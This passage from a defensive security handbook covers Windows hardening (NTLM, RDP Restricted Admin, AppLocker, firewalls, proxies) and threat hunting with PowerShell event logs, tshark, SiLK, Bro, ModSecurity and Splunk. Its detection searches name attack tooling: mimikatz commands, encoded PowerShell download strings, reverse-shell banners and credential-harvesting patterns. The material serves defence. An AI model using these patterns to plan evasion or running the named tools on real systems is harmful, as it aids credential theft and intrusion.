long-term goal being Kerberos only. Audit the use of NTLM v1 on the network Determine the risks and need to support NTLM v1 Disable the use of NTLM v1 Reference https://technet.microsoft.com/en-us/library/jj865674(v=ws.10).aspx https://technet.microsoft.com/en-us/library/dd560653%28v=ws.10%29.aspx Consider other Mitigations \u00b6 Consider other mitigations detailed at https://adsecurity.org/?p=3299 References https://adsecurity.org/?p=3299 Deploy security back-port patch (KB2871997) \u00b6 Ensure all Windows systems prior to Windows 8.1 & Windows Server 2012 R2 have the KB2871997 patch installed. This patch updates earlier supported versions of Windows with security enhancements baked into Windows 8.1 & Windows Server 2012 R2. References https://adsecurity.org/?p=559 https://blogs.technet.microsoft.com/kfalde/2014/11/01/kb2871997-and-wdigest-part-1/ Prevent local \"administrator\" accounts from authenticating over the network \u00b6 While the local Administrator (RID 500) account on two different computers has a different SID, if they have the same account name and password, the local Administrator account from one can authenticate as Administrator on the other. The same is true with any local account that is duplicated on multiple computers. This presents a security issue if multiple (or all) workstations in an organization have the same account name and password since compromise of one workstation results in compromise of all. Windows 8.1 & Windows 2012 R2 and newer introduced two new local SIDs: S-1-5-113: NT AUTHORITYLocal account S-1-5-114: NT AUTHORITYLocal account and member of Administrators group These SIDs are also added in earlier supported versions of Windows by installing the KB2871997 patch. Install patch KB2871997 Configure through Group Policy: \u00b6 1 2 3 4 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configuration > Windows Settings > Local Policies > User Rights Assignment 3 . Deny access to this computer from the network : Local account and member of Administrators group 4 . Deny log on through Remote Desktop Services : Local account and member of Administrators group Remote Connections \u00b6 RDP Restricted Admin (Connect to only 1 resource) \u00b6 mstsc / v : server / restrictedAdmin Enable Restricted Admin via Registry \u00b6 Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD DisableRestrictedAdmin = 0 or reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa / v DisableRestrictedAdmin / d 0 / t REG_DWORD Enable Restricted Admin via GPO \u00b6 1 2 3 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configurations > Policies > Administrative Templates > System > Credential Delegation 3 . Set \"Restrict Delegation of credential to remote servers\" to enable RDP Windows Defender Remote Credential Guard (Connect to multiple resources) \u00b6 mstsc / v : server / remoteguard Enable Windows Defender Credential Guard via Registry \u00b6 Manually create registry entry HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa DWORD DisableRestrictedAdmin = 0 or reg add HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa / v DisableRestrictedAdmin / d 0 / t REG_DWORD Enable WinDef Cred Guard via GPO \u00b6 1 2 3 4 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configurations > Policies > Administrative Templates > System > Credential Delegation 3 . Set \"Restrict Delegation of credential to remote servers\" to enable 4 . In Options , Under use the following restricted mode : Choose \"Prefer Windows Defender Remote Credential Guard\" Note If all systems are Windows 10/2016, Choose \"Require Remote Credential Guard\" Limit Client-to-Client Communication (Implement and Configure Host Based Firewalls) \u00b6 Clients and Server should be split into separate OU's Enable the Windows Firewall through GPO (Optional) Add exceptions to systems that are used to manage other hosts such as Sysadmins. Use a jump host to minimize exposure. Enable Firewall \u00b6 PowerShell 1) Create a GPO to hold the Workstation FW settings (workstation_fw) Example 1 2 Set - NetFirewallProfile - Profile Domain , Public , Private - Enabled True \u2013 PolicyStore example_domain . localworkstation_fw Set - NetFirewallProfile - DefaultInboundAction Block - DefaultOutboundAction Allow \u2013 NotifyOnListen True - AllowUnicastResponseToMulticast True \u2013 LogFileName % SystemRoot % System32LogFilesFirewallpfirewall . log \u2013 PolicyStore example_domain . localworkstation_fw 2) Assign the GPO to a Workstation Container References https://technet.microsoft.com/en-us/library/hh831755(v=ws.11).aspx Block/control TCP/UDP access from the Internal network and DMZ \u00b6 Evaluate the need for servers to connect to the Internet. Create a list of systems outside the network that require access. Limit access using this whitelist. Configure firewall rules to enforce these traffic policies. Block out bound TCP/UDP access from the Client systems to outbound networks. \u00b6 Clients generally only need a few ports to connect out bound. Limit access from client workstations to these ports. Create a list of ports required by clients to communicate outside the network. Limit access using this whitelist. Configure firewall rules to enforce these traffic policies. Rule can be managed at the HOST level via GPO or the network level via firewall rules. Implement a Proxy for All Outbound Traffic \u00b6 Force systems to traverse an proxy to communicate outbound. It is preferred to only allow authenticated communications. This prevents privilege users (SYSTEM, root) from communicating outbound. At a minimum, force all client's HTTP(S) and DNS through a proxy If possible, require user authentication Prevent outbound access if a client or system attempts to connect to external port directly using network firewall rules Create a new GPO to manage the proxy settings \u00b6 Edit the GPO User Configuration > Windows Settings > Internet Explorer Maintenance > Connection 1 2 Select Proxy Server Enter the Proxy IP address and Port Prevent Users from Changing Settings 1 2 User Configuration > Administrative Templates > Windows Components > Internet Explorer > Internet Control Panel Set Disable the Connections Page to Enabled Configurations \u00b6 AutoRuns \u00b6 1 2 3 4 5 1 . De - select \"Hide Microsoft Entries\" 2 . De - select \"Hide Windows Entries\" 3 . Under Scan Options , enable \"Verify code signatures\" 4 . Under Scan Options , enable \"Check VirusTotal.com\" ( note this shouldn ' t be done on GOV or otherwise sensitive networks ) 5 . Review all entries with multiple parameters Application White/Black listing \u00b6 A number of solutions exist to limit the applications a user can use on a system. AppLocker allows you to specify which users or groups can run particular applications in your organization based on unique identities of files. If you use AppLocker, you can create rules to allow or deny applications from running. Applocker \u00b6 AppLocker Executable Path Restrictions \u00b6 1 2 3 4 5 6 7 8 9 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configuration > Policies > Windows Settings > Security Settings > Application Control Policies > AppLocker 3 . Configure rule enforcement 4 . Executable rules , Check Configured , Enforce rules 5 . Overview > Executable Rules > Right Click Create New Rule 6 . Permissions > Deny > Domain Users 7 . Conditions > Path 8 . Exceptions > Add as / if required 9 . Create > Yes Interesting Paths \u00b6 1 2 3 4 5 1 . < drive letter > users < username > appdata ( % AppData % or for extension % AppData %* . exe 5 AppData %** . exe ) 2 . users \u0007 ppdatalocal 3 . users \u0007 ppdatalocaltemp 4 . users \u0007 ppdataroaming 5 . programdata Explicit Whitelisting \u00b6 1 2 3 4 5 6 7 8 1 . Open Group Policy Management ( gpmc . msc or via MMC Group Policy Object Editor ) 2 . Computer Configuration > Policies > Windows Settings > Security Settings > Software Restriction Policies 3 . Security Level Disallowed 4 . In additional rules allow a . % HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsNTCurrentVersionSystemRoot % b . % HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionProgramFilesDir ( x86 ) % c . % HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionProgramFilesDir % d . * . lnk Interesting file extensions \u00b6 .ade , .adp , .ani , .bas , .bat , .chm , .cmd , .com , .cpl , .crt , .exe , .hlp , .ht , .hta , .inf , .ins , .isp , .jar , .job , .js , .jse , .lnk , .mda , .mdb , .mde , .mdz , .msc , .msi , .msp , .mst , .ocx , .pcd , .ps1 , .reg , .scr , .sct , .shs , .svg , .url , .vb , .vbe , .vbs , .wbk , .wsc , .ws , .wsf , .wsh , .exe , .pif , .pub , .ip References https://technet.microsoft.com/en-us/library/dd759117(v=ws.11).aspx https://technet.microsoft.com/en-us/library/dd759123(v=ws.11).aspx https://technet.microsoft.com/en-us/library/dd759116(v=ws.11).aspx Manual Hunting and Detection Examples \u00b6 Filtering Event Logs via PowerShell \u00b6 Log locations on disk (only use event viewer or cli to copy) \u00b6 XP or older: %windir%system32config Vista or newer: %windir%system32winevtlogs Get times Service was installed (all evtx files, should be system) and count \u00b6 Get - WinEvent - FilterHashtable @ { Path = \"*.evtx\" ; ID = 7045 } | Measure - Object - Line Get blocked events \u00b6 Get - WinEvent - FilterHashtable @ { Path = \"AppLocker.evtx\" ; ID = 8004 } | Format - Table - Wrap Get WindowsDefender actions \u00b6 Get - WinEvent - FilterHashtable @ { Path = \"WindowsDefender.evtx\" ; ID = 1117 } | Format - Table Get WindowsDefender detections \u00b6 Get - WinEvent - FilterHashtable @ { Path = \"WindowsDefender.evtx\" ; ID = 1116 } | Format - Table Get files (by extension) with search from Application (crash) \u00b6 Get-WinEvent -FilterHashtable @ { Path = \"application.evtx\" } |Where { $_.Message - like \"*pdf*\" } |Format-Table -Wrap Get EMET events \u00b6 Get - WinEvent - FilterHashtable @ { Path = \"Win7-Application.evtx\" ; providername = \"EMET\" } | Format - Table - Wrap Get service installs and errors \u00b6 Get - WinEvent - FilterHashtable @ { Path = \"system.evtx\" ; ID = 7030 , 7045 } | fl Search for USB loading \u00b6 Get-WinEvent -FilterHashtable @ { Path = \"system.evtx\" ; ID = 7045 , 10000 , 10001 , 10100 , 20001 , 20002 , 30003 , 24576 , 24577 , 24579 } |Where { $_.Message - like \"*USB*\" } |fl Search for error/warning/info \u00b6 Get - WinEvent - FilterHashtable @ { Path = \"application.evtx\" ; level = 2 } Get remote eventlog (caution this drops credentials onto remote system) \u00b6 1 2 Get - EventLog - List - ComputerName < ip > Get - EventLog - LogName System - ComputerName Get log within X hours \u00b6 Get-EventLog System -after (get-date).addhours(-12) | Where { $_.entrytype - eq \"warning\" } Get logs during \"downtime\" \u00b6 Get-EventLog -LogName security | ? { $_.EventId - eq 4624 \u2013 and ( $_.TimeGenerated.TimeOfDay - gt '20:00:00' - or $_.TimeGenerated.TimeOfDay - lt '08:00:00' ) } | export-csv offhours.csv Use wevtutil to export logs (export-log) \u00b6 wevtutil . exe epl system system . evtx Use wevutil to get last 20 startups (use /r:computer for remote and qe for short query) \u00b6 wevutil query - events System / count : 20 / rd : true / format : text / q : \"Event[System[(EventID=12)]]\" Windows consolidated logging \u00b6 enable winrm winrm qc enable wecutil wecutil qc Create subscriptions and select events/filters in event viewer via event viewer or by PowerShell wecutil cs \"Creates a subscription\" wecutil ss \"Sets a subscription\" wecutil es \"Views subscriptions\" Get a detailed list of all security-auditing event entries (use an elevated prompt) \u00b6 wevtutil gp Microsoft - Windows - Security - Auditing / ge / gm : true Return a list of all security-auditing categories and subcategories (use an elevated prompt) \u00b6 auditpol / list / subcategory : * Network \u00b6 Network Flow Basics: \u00b6 Prevent traffic on uncommon ports (not if a good threat) Establish commonality in traffic (size, frequency, browser headers, etc.) Consistently review outlying DNS entries (very few connections or host traffic) Identify and investigate unique User-Agent strings Identify and investigate Base64 encoded strings within the URL Identify and investigate executables being downloaded and traversing the network Basic PCAP Carving (*nix) \u00b6 Note: The snippets below are examples for pcap carving. I'd highly recommend using bro/ for traffic analysis. Get certificates from pcap (use BRO if possible) \u00b6 tshark - nr file . pcap - 2 - R \"ssl.handshake.certificate\" - V > cert . txt or ssldump - Nr / path / file . pcap | awk ' BEGIN {c=0;} { if ($0 ~ /^[ ]+Certificate$/) {c=1; print \"========================================\";} if ($0 !~ /^ +/ ) {c=0;} if (c==1) print $0; } ' View certificates (see BRO) \u00b6 openssl x509 - in certsname . der - inform der - text - noout Get DNS queries from pcap and count instances \u00b6 tshark - r / path / file . pcap - T fields - e ip . src - e dns . qry . name - 2 - R \"dns.flags.response eq 0\" or tcpdump \u2013 n \u2013 r file . pcap \"port 53\" 2 >/ dev / null | grep \u2013 E 'A?' | awk '{print $(NF-1)}' | sort | uniq \u2013 c | sort \u2013 n Get DNS queries from NX domain \u00b6 tshark - r / path / file . pcap - T fields - e ip . src - e dns . qry . name - 2 - R \"dns.flags.rcode eq 3\" DNS Response Codes \u00b6 RCODE Name Description 0 NoError No Error 1 FormErr Format Error 2 ServFail Server Failure 3 NXDomain Non-Existent Domain 4 NotImp Not Implemented 5 Refused Query Refused 6 YXDomain Name Exists when it should not 7 YXRRSet RR Set Exists when it should not 8 NXRRSet RR Set that should exist does not 9 NotAuth Server Not Authoritative for zone 9 NotAuth Not Authorized 10 NotZone Name not contained in zone 16 BADVERS Bad OPT Version 16 BADSIG TSIG Signature Failure 17 BADKEY Key not recognized 18 BADTIME Signature out of time window 19 BADMODE Bad TKEY Mode 20 BADNAME Duplicate key name 21 BADALG Algorithm not supported 22 BADTRUNC Bad Truncation 23 BADCOOKIE Bad/missing Server Cookie Get User-Agents from pcap \u00b6 tshark - r / path / file . pcap - T fields - e http . user_agent | sort - n - k1 | uniq - c | sort - n or tcpdump \u2013 n \u2013 A \u2013 r file . pcap 'tcp port 80' | egrep \u2013 I \"User-Agent\" | sort | uniq \u2013 c | sort - n or strings / path / file . pcap | grep - i User - Agent | uniq - c | sort - n Get info for frame containing search dataf \u00b6 tshark - r / tmp / 10 . 10 . 10 . 52 : 1082 _10 . 10 . 19 . 32 : 80 - 6 . raw - 2 - R 'frame contains \"MZ\"' Search for string in tcp data (finds data not in field i.e. UA in json) \u00b6 tshark - r / path / file . pcap - T pdml - T fields - e tcp . data - 2 - R 'tcp contains \"User-Agent\"' | sed s / : // g | xxd - p - r | grep - a User - Agent | uniq - c Find strings in pcap \u00b6 tshark - r file . pcap - T pdml - T fields - e irc . response - Y 'frame contains \"badguy\"' or tshark - r file . pcap - T pdml - Y 'frame contains \"badguy\"' | grep badguy or ngrep - q - I / path / file . pcap \"badguy\" or strings / path / file . pcap | grep - i User - Agent | sort - u or tshark - r / path / file . pcap - T pdml - 2 - R 'frame contains \"User-Agent\"' | grep User - Agent Get the frame that contains string \u00b6 tshark - r file . pcap - 2 - R ' frame contains \"badguy\" Show packet data by field \u00b6 tshark - nr / path / file . pcap - T fields - e http . user_agent - 2 - R http . user_agent Get data & hex from first two packets in pcap \u00b6 tcpdump - n - r / path / file . pcap - c2 - x - v Get frames that have tcp header length gt 20 and port 25 \u00b6 tshark - r / path / file . pcap - Y 'tcp.hdr_len > 20 && tcp.port == 25' Get data in frames that have tcp header length gt 20 and port 25 \u00b6 tshark - r / path / file . pcap - T pdml - T fields - e tcp . port - e tcp . hdr_len - Y 'tcp.hdr_len > 20 && tcp.port == 25' Get frames with hex data 0x7932 \u00b6 tshark - r / path / file . pcap - Y 'ip.id == 0x7932' Get frames and show hex data \u00b6 tshark - r / path / file . pcap - T pdml - T fields - e ip . id - Y 'ip.id == 0x7932' Get all arp request and count (request=1, reply=2) \u00b6 tshark - r file . pcap - Y 'arp.opcode == 1' | wc - l Get ip.len less than 46 (64 for ethernet minus 14 header and 4 trailer) & icmp of 0 \u00b6 tshark - r file . pcap - Y 'ip.len < 46 && icmp.type == 0' Get ip option of loose src routing with offset starting at ip options \u00b6 tshark - r file . pcap - Y 'ip[20] == 0x83 && ip.hdr_len >20' Filter Info \u00b6 1 2 3 4 5 6 7 URG = 32 or 0 x20 ACK = 16 or 0 x10 PSH = 8 or 0 x08 RST = 4 or 0 x04 SYN = 2 or 0 x02 FIN = 1 or 0 x01 All = 0 xFF Examples: 'tcp[13] & 2 !=0' Get all SYN 'tcp[13] & 4 !=0' Get all RST 'tcp[13] & 16 !=0' Get all ACK Get frame with IP src and ACK flag set \u00b6 tshark - n - r / path / file . pcap '((ip.src == 192.168.10.1) and (tcp.flags.ack==1))' or tshark - n - r / path / file . pcap 'tcp[13] == 0x10 && ip.src == 192.168.10.1' or tcpdump - n - r / path / file . pcap 'src host 192.168.10.1 and tcp[13] = 0x10' Get frame with IP src and ACK or RST flag set \u00b6 tshark - n - r / path / file . pcap '((ip.src == 192.168.10.1) and (tcp.flags.syn==1 or tcp.flags.reset==1))' or tshark - n - r / path / file . pcap 'ip.src == 192.168.10.1 && tcp[13] == 0x14 or tcp[13] == 0x10 or tcp[13] == 0x04' or tcpdump - n - r / path / file . pcap 'src host 192.168.10.1 and tcp[13] & 0x14 !=0' Get frame with dst port 0 and DF flag set \u00b6 tshark - n - r / path / file . pcap 'tcp.port == 0 && ip[6] == 0x40' Get frame with net 10.10.10.10/24 \u00b6 tcpdump - n - r / path / file . pcap 'dst net 10.10.10 and ip[19] & 0xd0 = 0xd0' Get frames by ip \u00b6 tshark - n - r file . pcap '((ip.addr == 10.10.10.10) and (ip.addr == 192.168.10.11))' View specific frame verbose (note tcp stream index number) \u00b6 tshark - n - r file . pcap - Y frame . number == 12 - V Follow tcp stream 0 (ascii, raw, hex) \u00b6 tshark - n - r file . pcap - z \"follow,tcp,ascii,0\" Flow Data Analysis \u00b6 Use rwfilter to analyze flow data by IP and port \u00b6 rwfilter suspicious . silk --any-address=192.168.10.10 --aport=1088 --print-stat View detail of flow data by IP and port \u00b6 rwfilter suspicious . silk --any-address=192.168.10.10 --aport=1088 --pass=stdout|rwcut Extract all UDP from flow then pipe to get field 4 (4=dst port, 3=srcport, 5=proto, 6=packets, etc) \u00b6 rwfilter suspicious . silk --proto=17 --pass=stdout|rwuniq --fields=4 Extract connections from 10/8 with a reset to close then pipe to get srcIP count \u00b6 rwfilter suspicious . silk --any-address=10.10.0.0/16 --flags-all=R/R --pass=stdout|rwuniq --fields=1 Use rwstats to get flow data of top 5 flows \u00b6 rwstats suspicious . silk --fields sIP --bytes --count=5 Extract records not ICMP, TCP or UDP (note fail) and have src IP of 10.10.10.1 \u00b6 rwfilter suspicious . silk --proto=1,6,17 --fail=stdout|rwfilter --input-pipe=stdin --saddress=10.10.10.1 --pass=stdout | rwcut or rwfilter suspicious . silk --proto=0,2-5,7-16,18- --saddress=10.10.10.1 --pass=stdout | rwcut Get top 5 IP with data transfer \u00b6 rwstats phishing - attack . silk --fields=sip --top --bytes --count 5 Get flows with larger than 100,000 bytes \u00b6 rwfilter phishing - attack . silk --proto=6 --bytes=100000- --pass=stdout |rwcut -f 1-8 ELSA (BRO queries) \u00b6 ELSA most common svc \u00b6 class = BRO_CONN groupby:service ELSA BRO nx domains \u00b6 class = BRO_DNS nxdomain groupby:hostname ELSA BRO common FQDN \u00b6 class = BRO_HTTP \"-\" groupby:site ELSA BRO Sites hosting EXE \u00b6 class = BRO_HTTP BRO_HTTP . mime_type = \"x-dosexec\" groupby:site ELSA BRO URI with EXE downloads \u00b6 class = BRO_HTTP BRO_HTTP . mime_type = \"x-dosexec\" groupby:BRO_HTTP . uri ELSA BRO Internal IP EXE download \u00b6 class = BRO_FILES \"-\" mime_type = \"application/x-dosexec\" groupby:rx_hosts ELSA BRO connections w/o UA group by source IP \u00b6 class = BRO_HTTP \"-\" user_agent = \"-\" groupby:srcipt BRO \u00b6 BRO Logs \u00b6 Just a few logs that can be used to gather information. Note, custom logs can be created and referenced using the BRO. BRO Log Hunting \u00b6 BRO log Description conn.log IP/protocol connections conn-summary.log Statistics/summarizes activity known_hosts.log New hosts within past hour known_serices.log New services within past hour dpd.log Dynamic protocol detection weird.log Anomalous activity loaded_scripts.log Scripts loaded on start reporter.log Severity of issues with bro software.log Determines version of detected protocol various protocols (http,dns,ssl,etc) Activity log per protocol BRO Protocol Logs \u00b6 BRO log Description conn.log TCP/UDP/ICMP connections dce_rpc.log Distributed Computing Environment/RPC dhcp.log DHCP leases dnp3.log DNP3 requests and replies dns.log DNS activity ftp.log FTP activity http.log HTTP requests and replies irc.log IRC commands and responses kerberos.log Kerberos modbus.log Modbus commands and responses modbus_register_change.log Tracks changes to Modbus holding registers mysql.log MySQL ntlm.log NT LAN Manager (NTLM) radius.log RADIUS authentication attempts rdp.log RDP RDP rfb.log Remote Framebuffer (RFB) sip.log SIP smb_cmd.log SMB commands smb_files.log SMB files smb_mapping.log SMB trees smtp.log SMTP transactions snmp.log SNMP messages socks.log SOCKS proxy requests ssh.log SSH connections ssl.log SSL/TLS handshake info syslog.log Syslog messages tunnel.log Tunneling protocol events BRO Log Reference \u2013 https://www.bro.org/sphinx-git/script-reference/log-files.html BRO Carving \u00b6 Read and output bro logs \u00b6 bro - r file . pcap Get source src ip, dst ip, dst port, and bytes (in that order) \u00b6 cat conn . log | bro - cut id . orig_h id . resp_h id . resp_p orig_bytes | head - 2 Same as above but sort by bytes (field 5 reverse by number) \u00b6 cat conn . log | bro - cut id . orig_h id . orig_p id . resp_h id . resp_p orig_bytes | sort - k 5 - rn Get http on non-standard ports (ssl?) \u00b6 cat conn . log | bro - cut service id . resp_p id . resp_h | awk '$1 == \"http\" && ! ($2 == 80 || $2 == 8080) { print $3 }' | sort - u Extract DNS info from bro logs \u00b6 cat dns . log | bro - cut query | sort - u and cat dns . log | bro - cut - d answers | sort - u Get User-Agents \u00b6 cat http . log | bro - cut user_agent | sort | uniq - c | sort - n Get Mime Types \u00b6 cat http . log | bro - cut orig_mime_type | sort | uniq - c | sort - n Get bro outbound signature stored in .sig file (read with -s) \u00b6 1 2 3 4 5 6 7 8 signature outbound - sig { ip - proto == tcp src - ip == 192 . 168 . 0 . 0 / 16 dst - ip != 192 . 168 . 0 . 0 / 16 dst - port == 80 http - request - header /^ User - Agent :. */ event \"Outbound HTTP traffic\" } Get bro Windows Shell signature stored in .sig file (read with -s) \u00b6 1 2 3 4 5 6 signature windows_reverse_shell { ip - proto == tcp tcp - state established , originator event \"ATTACK-RESPONSES Microsoft cmd.exe banner (reverse-shell originator)\" payload / . * Microsoft Windows . * x28Cx29 Copyright 1985 - . * Microsoft Corp / } 1 2 3 4 5 6 signature windows_shell { ip - proto == tcp tcp - state established , responder event \"ATTACK-RESPONSES Microsoft cmd.exe banner (normal-shell responder)\" payload / . * Microsoft Windows . * x28Cx29 Copyright 1985 - . * Microsoft Corp / } Run bro with sig file \u00b6 1 bro - r file . pcap - s outbound . sig View dst addresses in signature file \u00b6 cat signatures . log | bro - cut dst_addr | sort | uniq - c | sort - n BRO event script to find User-Agent (outbound.bro) \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 event http_header ( c : connection , is_orig : bool , name : string , value : string ) { local snet = 192 . 168 . 0 . 0 / 16 ; if ( c $ id $ orig_h in snet ) { if ( c $ id $ resp_h ! in snet ) { if ( c $ id $ resp_p == 80 / tcp && name == \" USER-AGENT \" ) { print fmt ( \" source IP %s, destination IP/port %s %s, USER-AGENT content %s \" , c $ id $ orig_h , c $ id $ resp_h , c $ id $ resp_p , value ) ; } } } } BRO Scripting Reference \u2013 https://www.bro.org/sphinx/scripting/ Run event file to view user-agent \u00b6 bro - r file . pcap outbound - event . bro BRO extract common files from pcap \u00b6 sudo bro - r file . pcap / opt / bro / share / bro / file - extraction / extract . bro Extract ssl info \u00b6 cat ssl . log | bro - cut server_name , subject , issuer_subject BRO extract unique SSL certificate data \u00b6 bro - C - r file . pcap > cert_data . txt BRO extract SSL issuer data from certificate extraction \u00b6 cat ssl . log | bro - cut issuer_subject | sort - u > / tmp / bro / data . txt BRO show shortest issuer from extraction \u00b6 cat / tmp / bro / data . txt | awk '{print length, $0}' | sort - nr ModSecurity rules \u00b6 error.log UA not starting with Mozilla \u00b6 SecRule REQUEST_HEADERS : User - Agent \"!^Mozilla/d.d\" \"log,msg:'User-Agent without Mozilla/#.#'\" error.log visiting IP URL \u00b6 SecRule REQUEST_HEADERS : Host \"^[d.:]+$\" \"log,msg:'Host used an IP address'\" error.log blank UA \u00b6 SecRule REQUEST_HEADERS : User - Agent \"^$\" \"log,msg:'Request has blank UA'\" error.log UA starting with mozilla \u00b6 SecRule REQUEST_HEADERS : User - Agent \"^mozilla\" \"log,msg:'Request has mozilla UA'\" error.log visiting by IP log UA used \u00b6 SecRule REQUEST_HEADERS : Host \" ^[d.:]+$ \" \" log,msg:'Host used an IP address check errorlog for UA',logdata:'User-Agent:%{REQUEST_HEADERS.User-Agent}' \" error.log no UA (not blank but none) \u00b6 SecRule & REQUEST_HEADERS : User - Agent \"@eq 0\" \"log,msg:'Request missing UA',logdata:'User-Agent:%{REQUEST_HEADERS.User-Agent}'\" error.log note param entry \u00b6 SecRule & ARGS : password \"@gt 1\" \"log,msg:'PW data',logdata:'params:%{REQUEST_LINE}'\" error.log trigger on keyword (can use pattern) \u00b6 # Trigger on EXFIL from body ( phase : 4 is the Response Body ) SecRule RESPONSE_BODY \"badguy\" \"phase:4, msg:'HoneyToken Exfil Detected', tag:'HONEYTOKEN EXFIL'\" Splunk \u00b6 Note these are examples and are mainly illustrated as templates for creating your own internal searches New unauthorized service \u00b6 index = windows LogName = System EventCode = 7045 NOT ( Service_Name =< yourscanner > ) | eval Message = split ( Message , \".\" ) | eval Short_Message = mvindex ( Message , 0 ) | table_time , host , Service_Name , Service_Type , Service_Start_Type , Service_Account , Short_Message Detecting process abuse \u00b6 index = sysmon SourceType = \"WinEventLog:Microsoft-Windows-Sysmon/Operational\" ProcessCreate ( whoami OR netstat OR etc ) | search EventCode = 1 Image = \"*\\whoami.exe\" OR Image = \"* etstat.exe\" OR Image = \"* asklist.exe\" | bin ) time span = 5 m | rex field = Message \".*User:(xxx|NT AUTHORITY)\\(?<USER>.*)\" | stats dc ( Image ) AS CNT_CMDS values ( CommandLine ) values ( ParentImage ) values ( ParentCommandLine ) count by _time ComputerName USER Detecting process abuse (simplified, requires one entry per process) \u00b6 index = sysmon Image = \"* et.exe\" ( CommandLine = \"*net group*\" OR CommandLine = \"*net localgroup*\" OR CommandLine = \"*net user*\" ) | stats count by Computer , CommandLine Process starts and connects to IP \u00b6 index = windows LogName = System EventCode = 5156 NOT ( Source_Address = \"10.10.10.15\" ) NOT ( Application_Name = \"path:file.exe\" ) | eval Message = split ( Message , \".\" ) | table_time , host , Application_Name , Source_Address , Destination_Address , Direction Detect SMB traffic between clients \u00b6 index = sysmon SourceName = \"Microsoft-Windows-Sysmon\" EventCode = 3 Initiated = true SourceIp != DestinationIp DestinationPort = 445 Image != System ( SourceHostname = \"fileserver1\" DestinationHostname = \"client1\" ) OR ( Source_Address = \"10.10.1.5\" Destination_Address = \"10.10.10.15\" ) | stats by ComputerName ProcessGuid | fields ComputerName ProcessGuid Detect Named Pipes \u00b6 index = sysmon sourcetype = \"WinEventLog:Microsoft-Windows-Sysmon/Operational\" ( PipeEvent \"Pipe Created\" ) | search ( EventCode = 17 ( PipeName = \"\\*\" )) | stats values ( Image ) AS Images values ( PipeName ) AS PipeNames count by TaskCategory ComputerName Detect WMI \u00b6 index = sysmon Image = \"*\\WMIC.exe\" ( CommandLine = \"*process call create*\" OR CommandLine = \"*/NODE:*\" ) | stats count by Computer , CommandLine and index = sysmon ParentImage = \"*\\WmiPrvSE.exe\" | stats count by Computer , CommandLine Detect PowerShell Commands \u00b6 index = sysmon ParentImage = \"*wsmprovhost.exe\" | stats count by Computer , CommandLine and index = sysmon Image = \" *powershell.exe \" ( CommandLine = \" *-EncodedCommand* \" OR CommandLine = \" *-Enc* \" OR CommandLine = \" *-e* \" OR CommandLine = \" *new-object* \" OR CommandLine = \" *-nop* \" OR CommandLine = \" *-noprofile \" OR CommandLine = \" *-Command* \" OR COmmandLine = \" *-c* \" OR CommandLine = \" *Invoke-Command* \" OR CommandLine = \" *download* \" OR CommandLine = \" *IEX* \" OR CommandLine = \" *exec* \" ) | stats count by Computer , CommandLine Alert on remote files copied via cmd line \u00b6 index = windows LogName = Security EventCode = 5145 Object_Type = File Share_Name =* $ ( Access_Mask = 0 x100180 OR Access_Mask = 0 x80 OR Access_Mask = 0 x130197 ) | bucket span = 1 s _time | rex \"(?(0x100180|0x80|0x130197))\" | stats values ( Relative_Target_Name ) AS Relative_Target_Name , values ( Account_Name ) AS Account_Name , values ( Source_Address ) AS Source_Address , dc ( thingtype ) AS distinct_things by ComputerName , _time | search distinct_things = 3 Alert on C or Admin share enumeration \u00b6 index = windows LogName = Security EventCode = 5145 Share_Name =* c $ OR * ADMIN $ ( Access_Mask = 0 x100180 ) NOT ( Source_Address = \"10.10.10.15\" ) | bucket span = 1 s _time | rex \"(?(0x100180))\" | stats values ( Relative_Target_Name ) AS Relative_Target_Name , values ( Account_Name ) AS Account_Name , values ( Source_Address ) AS Source_Address , dc ( thingtype ) AS distinct_things by ComputerName , _time | search distinct_things = 3 Search for file delivery \u00b6 index = sysmon SourceName = \"Microsoft-Windows-Sysmon\" FileCreateStreamHash badfile . exe | search EventCode = 15 | rex field = TargetFilename \".*\\(?<TargFilename>[^\\]*)\" | rex field = Image \".*\\(?<ImageFilename[^\\]*)\" | rex field = Hash \".*MD5=(?<MD5>[A-F0-9]*),IMPHASH=(?<IMPHASH>[A-F0-9]*)\" | stats values ( TargFilename ) values ( ComputerName ) AS Clients count by TaskCategory ImageFilename MD5 Search for Registry Run (or RunOnce) Keys \u00b6 index = sysmon SourceName = \"Microsoft-Windows-Sysmon\" RegistryEvent CurrentVersion Run | search EventCode = 13 \"*\\Windows\\CurrentVersion\\Run*\" | rex field = Image \".*\\(?Image_EXE>[^\\]*)\" | rex field = TargetObject \".*\\CurrentVersion\\(?<TargetObj_PATH>.*)\" | strcat \"Image=\"\" IMage_EXE \"\", TargetObject=\"\" TargetObj_PATH \"\", Details=\"\" Details \"\"\" Image_TargetObj_Details | stats dc ( ComputerName ) AS Clients values ( Image_TragetObj_Details ) count by TaskCategory Image_EXE Search for file system persistence \u00b6 index = sysmon SourceName = \"Microsoft-Windows-Sysmon\" ProcessCreate \"Start Menu\" Programs Startup | search Image = \"*\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*\" | rex field = Image \".*\\Programs\\Startup\\(?<Startup_Image>[^\\]*)\" | rex field = Hash \".*MD5=(?<MD5>[A-F0-9]*),IMPHASH=(?<IMPHASH>[A-F0-9]*)\" | stats values ( ComputerName ) AS Clients vlaues ( MD5 ) count by IMPHASH Startup_Image Detect credential harvesting \u00b6 index = sysmon ParentImage = \"*\\services.exe\" | regex CommandLine = \"\\[a-z0-9]{8}-[a-z0-9]{4}-[az0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}.exe-S$\" and index = sysmon CommandLine = \"*privileges::debug*\" OR CommandLine = \"*sekurlsa::*\" OR CommandLine = \"*kerberos::*\" OR CommandLine = \"*crypto::*\" OR CommandLine = \"*lsadump::*\" OR CommandLine = \"*process::*\" Potential Privilege 